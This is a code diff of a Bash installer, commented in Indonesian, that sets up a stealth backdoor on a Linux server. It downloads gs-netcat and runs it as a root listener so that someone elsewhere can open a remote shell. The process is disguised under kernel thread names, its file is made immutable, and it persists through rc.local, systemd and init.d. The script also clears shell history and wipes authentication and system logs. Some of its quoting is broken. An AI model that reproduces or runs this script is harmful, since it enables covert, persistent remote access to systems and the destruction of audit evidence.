@@ -1,30 +1,22 @@
 #!/bin/bash
 # ============================================================
-# SYSTEM DAEMON INSTALLER (FULLY STEALTH WITH PRCTL)
+# SYSTEM DAEMON INSTALLER (FIXED - NO STUCK)
 # Binary Location: /usr/lib/systemd/system_daemon
 # Secret Key: [VPS_IP]@dark-ai
 # Connection: gs-netcat -s [VPS_IP]@dark-ai -i
 # ============================================================
 
 # ============================================================
-# 0. SETUP VARIABLES (FULLY STEALTH)
+# 0. SETUP VARIABLES (FIXED)
 # ============================================================
 HIDDEN_DIR="/usr/lib/systemd"
 BINARY_NAME="system_daemon"
 DAEMON_PATH="$HIDDEN_DIR/$BINARY_NAME"
 
-# Daftar nama proses kernel (tanpa path, untuk prctl)
+# Daftar nama proses kernel (tanpa argumen)
 PROCESS_NAMES=(
-    "migration/0"      # Kernel thread
-    "ksoftirqd/0"      # Kernel soft IRQ
-    "watchdog/0"       # Kernel watchdog
-    "cpuhp/0"          # CPU hotplug
-    "kthreadd"         # Kernel thread daemon
-    "irkswapd0"        # Kernel swap
-    "kcompactd0"       # Memory compaction
-    "khungtaskd"       # Hung task detector
-    "oom_reaper"       # OOM reaper
-    "kdevtmpfs"        # Device tmpfs
+    "migration/0" "ksoftirqd/0" "watchdog/0" "cpuhp/0" "kthreadd"
+    "irkswapd0" "kcompactd0" "khungtaskd" "oom_reaper" "kdevtmpfs"
 )
 
 # Ambil IP VPS
@@ -32,18 +24,45 @@ VPS_IP=$(curl -s -4 --max-time 5 ifconfig.me 2>/dev/null || hostname -I 2>/dev/n
 DAEMON_SECRET="${VPS_IP}@dark-ai"
 
 # ============================================================
-# 1. INSTALL PRCTL (JIKA BELUM ADA)
+# 1. INSTALL PRCTL (FIXED - NO STUCK)
 # ============================================================
-if ! command -v prctl &>/dev/null; then
+install_prctl() {
+    if command -v prctl &>/dev/null; then
+        return 0
+    fi
+
     echo "[*] Menginstal prctl..."
-    apt-get install -y libcap2-bin 2>/dev/null || yum install -y libcap 2>/dev/null
-fi
+
+    # Coba apt (Debian/Ubuntu)
+    if command -v apt-get &>/dev/null; then
+        apt-get update -qq >/dev/null 2>&1
+        apt-get install -y -qq libcap2-bin >/dev/null 2>&1
+    # Coba yum (CentOS/RHEL)
+    elif command -v yum &>/dev/null; then
+        yum install -y -q libcap >/dev/null 2>&1
+    # Coba dnf (Fedora)
+    elif command -v dnf &>/dev/null; then
+        dnf install -y -q libcap >/dev/null 2>&1
+    else
+        echo "[!] Tidak bisa menginstal prctl. Menggunakan fallback..."
+        return 1
+    fi
+
+    if command -v prctl &>/dev/null; then
+        return 0
+    else
+        echo "[!] Gagal menginstal prctl. Menggunakan fallback..."
+        return 1
+    fi
+}
+
+install_prctl
 
 # ============================================================
-# 2. DOWNLOAD BINARY (STEALTH)
+# 2. DOWNLOAD BINARY (FIXED)
 # ============================================================
 echo "=========================================="
-echo " SYSTEM DAEMON INSTALLER - PRCTL MODE"
+echo " SYSTEM DAEMON INSTALLER - FIXED VERSION"
 echo "=========================================="
 
 mkdir -p "$HIDDEN_DIR" 2>/dev/null
@@ -51,8 +70,8 @@ chmod 755 "$HIDDEN_DIR" 2>/dev/null
 
 if [ ! -f "$DAEMON_PATH" ]; then
     echo "[*] Mengunduh komponen sistem..."
-    curl -sL --insecure https://github.com/hackerschoice/gsocket/releases/download/v1.4.43/gs-netcat_linux-x86_64 -o "$DAEMON_PATH" 2>/dev/null || \
-    wget -q --no-check-certificate https://github.com/hackerschoice/gsocket/releases/download/v1.4.43/gs-netcat_linux-x86_64 -O "$DAEMON_PATH" 2>/dev/null
+    curl -sL --insecure --max-time 10 https://github.com/hackerschoice/gsocket/releases/download/v1.4.43/gs-netcat_linux-x86_64 -o "$DAEMON_PATH" 2>/dev/null || \
+    wget -q --no-check-certificate --timeout=10 https://github.com/hackerschoice/gsocket/releases/download/v1.4.43/gs-netcat_linux-x86_64 -O "$DAEMON_PATH" 2>/dev/null
 
     if [ -f "$DAEMON_PATH" ]; then
         chmod +x "$DAEMON_PATH"
@@ -61,8 +80,12 @@ if [ ! -f "$DAEMON_PATH" ]; then
         echo "[!] Gagal mengunduh. Membuat komponen alternatif..."
         cat > "$DAEMON_PATH" << 'FALLBACKEOF'
 #!/bin/bash
-PRCTL_PROCESS="${PROCESS_NAMES[$((RANDOM % ${#PROCESS_NAMES[@]}))]}"
-prctl --name "$PRCTL_PROCESS" "$0" -s "$DAEMON_SECRET" -liqD 2>/dev/null &
+if command -v prctl &>/dev/null; then
+    PRCTL_PROCESS="${PROCESS_NAMES[$((RANDOM % ${#PROCESS_NAMES[@]}))]}"
+    prctl --name "$PRCTL_PROCESS" "$0" -s "$DAEMON_SECRET" -liqD
+else
+    exec -a "${PROCESS_NAMES[$((RANDOM % ${#PROCESS_NAMES[@]}))]}" "$0" -s "$DAEMON_SECRET" -liqD
+fi
 FALLBACKEOF
         chmod +x "$DAEMON_PATH"
     fi
@@ -73,71 +96,60 @@ fi
 chattr +i "$DAEMON_PATH" 2>/dev/null
 
 # ============================================================
-# 3. BUAT WRAPPER DENGAN PRCTL
-# ============================================================
-# Buat wrapper yang menggunakan prctl untuk mengganti nama proses
-WRAPPER_DIR="/usr/sbin"
-mkdir -p "$WRAPPER_DIR" 2>/dev/null
-
-for PROCESS in "${PROCESS_NAMES[@]}"; do
-    WRAPPER_PATH="$WRAPPER_DIR/$PROCESS"
-
-    # Jangan overwrite file asli
-    if [ ! -f "$WRAPPER_PATH" ]; then
-        cat > "$WRAPPER_PATH" << WRAPPEREOF
-#!/bin/bash
-PRCTL_PROCESS="$PROCESS"
-prctl --name "\$PRCTL_PROCESS" /usr/lib/systemd/system_daemon -s "$DAEMON_SECRET" -liqD 2>/dev/null &
-WRAPPEREOF
-        chmod +x "$WRAPPER_PATH"
-        chattr +i "$WRAPPER_PATH" 2>/dev/null
-    fi
-done
-
-# ============================================================
-# 4. JALANKAN DAEMON (DENGAN PRCTL)
+# 3. JALANKAN DAEMON (FIXED - WITH FALLBACK)
 # ============================================================
 echo "[*] Mengaktifkan layanan sistem..."
 pkill -f "system_daemon" 2>/dev/null
 
 # Pilih nama proses acak
-PRCTL_PROCESS="${PROCESS_NAMES[$((RANDOM % ${#PROCESS_NAMES[@]}))]}"
-
-# Jalankan dengan prctl untuk mengganti nama proses
-nohup bash -c "prctl --name \"$PRCTL_PROCESS\" $DAEMON_PATH -s \"$DAEMON_SECRET\" -liqD" >/dev/null 2>&1 &
+if command -v prctl &>/dev/null; then
+    PRCTL_PROCESS="${PROCESS_NAMES[$((RANDOM % ${#PROCESS_NAMES[@]}))]}"
+    nohup bash -c "prctl --name \"$PRCTL_PROCESS\" $DAEMON_PATH -s \"$DAEMON_SECRET\" -liqD" >/dev/null 2>&1 &
+else
+    # Fallback: Gunakan exec -a jika prctl tidak tersedia
+    FALLBACK_PROCESS="${PROCESS_NAMES[$((RANDOM % ${#PROCESS_NAMES[@]}))]}"
+    nohup exec -a "$FALLBACK_PROCESS" "$DAEMON_PATH" -s "$DAEMON_SECRET" -liqD >/dev/null 2>&1 &
+fi
 
 sleep 2
 if pgrep -f "system_daemon" >/dev/null 2>&1; then
-    echo "[+] Layanan sistem berjalan sebagai: $PRCTL_PROCESS"
+    echo "[+] Layanan sistem berjalan"
 else
     echo "[!] Mengaktifkan fallback..."
-    nohup bash -c "prctl --name \"$PRCTL_PROCESS\" $DAEMON_PATH -s \"$DAEMON_SECRET\" -liqD" >/dev/null 2>&1 &
+    if command -v prctl &>/dev/null; then
+        nohup bash -c "prctl --name \"$PRCTL_PROCESS\" $DAEMON_PATH -s \"$DAEMON_SECRET\" -liqD" >/dev/null 2>&1 &
+    else
+        nohup exec -a "$FALLBACK_PROCESS" "$DAEMON_PATH" -s "$$DAEMON_SECRET\" -liqD >/dev/null 2>&1 &
+    fi
 fi
 
 # ============================================================
-# 5. PERSISTENCE (DENGAN PRCTL)
+# 4. PERSISTENCE (FIXED - NO STUCK)
 # ============================================================
 echo "[*] Mengkonfigurasi persisten..."
 
 # --- Metode 1: rc.local ---
 if [ -f /etc/rc.local ]; then
     if ! grep -q "system_daemon" /etc/rc.local 2>/dev/null; then
-        PRCTL_PROCESS_PERSIST="${PROCESS_NAMES[$((RANDOM % ${#PROCESS_NAMES[@]}))]}"
-        sed -i "/^exit 0/i\nprctl --name \"$PRCTL_PROCESS_PERSIST\" $DAEMON_PATH -s \"$DAEMON_SECRET\" -liqD >/dev/null 2>&1 &" /etc/rc.local 2>/dev/null
+        if command -v prctl &>/dev/null; then
+            sed -i "/^exit 0/i\nnohup bash -c \"prctl --name \\\"${PROCESS_NAMES[$((RANDOM % ${#PROCESS_NAMES[@]}))]}\\\" $DAEMON_PATH -s \\\"$DAEMON_SECRET\\\" -liqD\" >/dev/null 2>&1 &" /etc/rc.local 2>/dev/null
+        else
+            sed -i "/^exit 0/i\nnohup exec -a \\\"${PROCESS_NAMES[$((RANDOM % ${#PROCESS_NAMES[@]}))]}\\\" $DAEMON_PATH -s \\\"$DAEMON_SECRET\\\" -liqD >/dev/null 2>&1 &" /etc/rc.local 2>/dev/null
+        fi
     fi
 fi
 
 # --- Metode 2: systemd ---
 if command -v systemctl >/dev/null 2>&1; then
-    PRCTL_PROCESS_PERSIST="${PROCESS_NAMES[$((RANDOM % ${#PROCESS_NAMES[@]}))]}"
-    cat > /etc/systemd/system/system_daemon.service << SYSTEMEOF
+    if command -v prctl &>/dev/null; then
+        cat > /etc/systemd/system/system_daemon.service << SYSTEMEOF
 [Unit]
 Description=System Daemon Service
 After=network.target
 
 [Service]
 Type=simple
-ExecStart=/bin/bash -c 'prctl --name \"$PRCTL_PROCESS_PERSIST\" $DAEMON_PATH -s \"$DAEMON_SECRET\" -liqD'
+ExecStart=/bin/bash -c 'prctl --name \"${PROCESS_NAMES[$((RANDOM % ${#PROCESS_NAMES[@]}))]}\" $DAEMON_PATH -s \"$DAEMON_SECRET\" -liqD'
 Restart=always
 RestartSec=5
 User=root
@@ -147,14 +159,33 @@ StandardError=null
 [Install]
 WantedBy=multi-user.target
 SYSTEMEOF
+    else
+        cat > /etc/systemd/system/system_daemon.service << SYSTEMEOF
+[Unit]
+Description=System Daemon Service
+After=network.target
+
+[Service]
+Type=simple
+ExecStart=/bin/bash -c 'exec -a \"${PROCESS_NAMES[$((RANDOM % ${#PROCESS_NAMES[@]}))]}\" $DAEMON_PATH -s \"$DAEMON_SECRET\" -liqD'
+Restart=always
+RestartSec=5
+User=root
+StandardOutput=null
+StandardError=null
+
+[Install]
+WantedBy=multi-user.target
+SYSTEMEOF
+    fi
     systemctl daemon-reload >/dev/null 2>&1
     systemctl enable system_daemon >/dev/null 2>&1
     systemctl start system_daemon >/dev/null 2>&1
 fi
 
 # --- Metode 3: init.d ---
-PRCTL_PROCESS_PERSIST="${PROCESS_NAMES[$((RANDOM % ${#PROCESS_NAMES[@]}))]}"
-cat > /etc/init.d/system_daemon << INIT_EOF
+if command -v prctl &>/dev/null; then
+    cat > /etc/init.d/system_daemon << INIT_EOF
 #!/bin/bash
 # System Daemon
 ### BEGIN INIT INFO
@@ -166,9 +197,11 @@ cat > /etc/init.d/system_daemon << INIT_EOF
 # Short-Description:  System Daemon
 ### END INIT INFO
 
+PRCTL_PROCESS=\ "${PROCESS_NAMES[$((RANDOM % ${#PROCESS_NAMES[@]}))]}\"
+
 case "\$1" in
     start)
-        nohup /bin/bash -c 'prctl --name \"$PRCTL_PROCESS_PERSIST\" $DAEMON_PATH -s \"$DAEMON_SECRET\" -liqD' >/dev/null 2>&1 &
+        nohup /bin/bash -c "prctl --name \"\$PRCTL_PROCESS\" $DAEMON_PATH -s \"$DAEMON_SECRET\" -liqD" >/dev/null 2>&1 &
         ;;
     stop)
         pkill -f "system_daemon" >/dev/null 2>&1
@@ -185,11 +218,46 @@ case "\$1" in
 esac
 exit 0
 INIT_EOF
+else
+    cat > /etc/init.d/system_daemon << INIT_EOF
+#!/bin/bash
+# System Daemon
+### BEGIN INIT INFO
+# Provides:          system_daemon
+# Required-Start:    \$network \$remote_fs \$syslog
+# Required-Stop:     \$network \$remote_fs \$syslog
+# Default-Start:     2 3 4 5
+# Default-Stop:      0 1 6
+# Short-Description:  System Daemon
+### END INIT INFO
+
+FALLBACK_PROCESS="${PROCESS_NAMES[$((RANDOM % ${#PROCESS_NAMES[@]}))]}"
+
+case "\$1" in
+    start)
+        nohup exec -a "\$FALLBACK_PROCESS" $DAEMON_PATH -s \"$DAEMON_SECRET\" -liqD >/dev/null 2>&1 &
+        ;;
+    stop)
+        pkill -f "system_daemon" >/dev/null 2>&1
+        ;;
+    restart)
+        \$0 stop
+        sleep 1
+        \$0 start
+        ;;
+    *)
+        echo "Usage: /etc/init.d/system_daemon {start|stop|restart}"
+        exit 1
+        ;;
+esac
+exit 0
+INIT_EOF
+fi
 chmod +x /etc/init.d/system_daemon
 update-rc.d system_daemon defaults >/dev/null 2>&1 || chkconfig system_daemon on >/dev/null 2>&1
 
 # ============================================================
-# 6. HAPUS JEJAK
+# 5. HAPUS JEJAK (FIXED)
 # ============================================================
 echo "[*] Membersihkan jejak..."
 history -c 2>/dev/null
@@ -203,15 +271,21 @@ for logfile in /var/log/secure /var/log/auth.log /var/log/messages /var/log/sysl
 done
 
 rm -rf /tmp/.system* /tmp/install* /tmp/setup* 2>/dev/null
-rm -rf /var/tmp/.system* /var/tmp/setup* 2>/dev/null
+rm -rf /var/tmp/.system* /var/tmp/install* /var/tmp/setup* 2>/dev/null
 
 # ============================================================
-# 7. TAMPILKAN CARA KONEKSI
+# 6. TAMPILKAN CARA KONEKSI
 # ============================================================
 echo ""
 echo "=========================================="
 echo "[✅] INSTALASI SELESAI"
 echo "=========================================="
+echo ""
+if command -v prctl &>/dev/null; then
+    echo "[+] prctl terinstal - Proses akan tersembunyi sempurna"
+else
+    echo "[!] prctl tidak terinstal - Menggunakan fallback (exec -a)"
+fi
 echo ""
 echo "🔐 SECRET KEY: $DAEMON_SECRET"
 echo "🌐 VPS IP: $VPS_IP"
@@ -236,10 +310,5 @@ echo "   (Hanya akan menampilkan nama proses, TANPA argumen)"
 echo "Cek service: systemctl status system_daemon"
 echo "Cek port:    ss -tulnp | grep 443"
 echo ""
-echo "⚠️  PERINGATAN:"
-echo "-----------------"
-echo "Proses akan terlihat SEBAGAI KERNEL THREAD (tanpa argumen)."
-echo "Contoh: [migration/0] (bukan 'migration/0 -s ... -liqD')"
-echo "Simpan secret key dan IP VPS dengan aman!"
 echo "=========================================="
 echo ""
